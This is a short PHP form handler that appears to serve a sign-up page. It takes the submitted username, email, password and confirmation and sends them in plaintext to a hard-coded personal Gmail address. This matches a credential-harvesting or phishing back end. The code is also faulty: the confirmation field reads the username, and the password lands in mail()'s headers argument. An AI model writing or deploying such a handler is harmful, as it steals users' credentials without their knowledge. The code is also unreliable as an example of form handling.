<?php

$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];
$passwordConfirm = $_POST['username'];
    mail('shamsiddinkhon@gmail.com',$username,$email,$password,$passwordConfirm);
?>